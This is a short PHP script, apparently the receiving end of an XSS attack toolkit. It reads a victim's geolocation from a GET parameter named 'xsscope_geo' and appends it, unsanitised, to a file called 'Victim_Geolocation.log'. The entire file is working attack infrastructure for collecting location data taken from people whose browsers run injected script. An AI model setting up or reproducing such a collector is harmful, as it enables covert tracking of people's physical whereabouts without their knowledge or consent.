<?php
if(!empty($_GET['xsscope_geo'])) {
    $logfile1 = fopen('Victim_Geolocation.log', 'a+');
    fwrite($logfile1, $_GET['xsscope_geo']);
    fclose($logfile1);
}
?> 
